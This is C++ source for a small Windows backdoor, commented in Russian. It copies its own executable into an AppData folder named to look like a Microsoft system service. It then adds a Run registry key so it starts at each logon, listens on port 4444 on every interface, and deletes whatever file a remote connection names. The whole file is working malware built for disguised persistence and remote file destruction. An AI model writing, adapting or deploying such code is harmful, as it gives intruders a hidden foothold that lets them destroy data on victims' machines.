#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>   // для SHGetFolderPathA
#include <cstring>

void copyToSystem() {
    char currentPath[MAX_PATH];
    char destPath[MAX_PATH];

    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath) != S_OK) {
        return;
    }

    strcat_s(destPath, "\\Microsoft\\SystemService");
    CreateDirectoryA(destPath, NULL);

    strcat_s(destPath, "\\client.exe");

    if (_stricmp(currentPath, destPath) == 0) {
        return;
    }

    CopyFileA(currentPath, destPath, FALSE);
}

void addToAutorun() {
    HKEY hKey;
    char destPath[MAX_PATH];

    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath) != S_OK) {
        return;
    }
    strcat_s(destPath, "\\Microsoft\\SystemService\\client.exe");

    LONG res = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey
    );

    if (res != ERROR_SUCCESS) {
        return;
    }

    RegSetValueExA(
        hKey,
        "SystemService",      // имя записи в автозапуске
        0, REG_SZ,
        (BYTE*)destPath,
        (DWORD)(strlen(destPath) + 1)
    );

    RegCloseKey(hKey);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    copyToSystem();
    addToAutorun();
    
    WSADATA wsData; // для версий сокетов

    int erStat = WSAStartup(MAKEWORD(2,2), &wsData); // запуск	
    SOCKET server = socket(AF_INET, SOCK_STREAM, 0); // возвращает дескриптор с номером сокета, под которым он зарегистрирован в ОС

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);    // слушаем на порту 4444
    addr.sin_addr.s_addr = INADDR_ANY; // принимаем с любого IP

    bind(server, (sockaddr*)&addr, sizeof(addr));

    listen(server, 1); // 1 = максимум 1 соединение в очереди

    SOCKET client = accept(server, nullptr, nullptr);

    char filename[256] = {0};
    recv(client, filename, sizeof(filename), 0);

    DeleteFileA(filename);

    closesocket(client);
    closesocket(server);
    WSACleanup();
    return 0;
}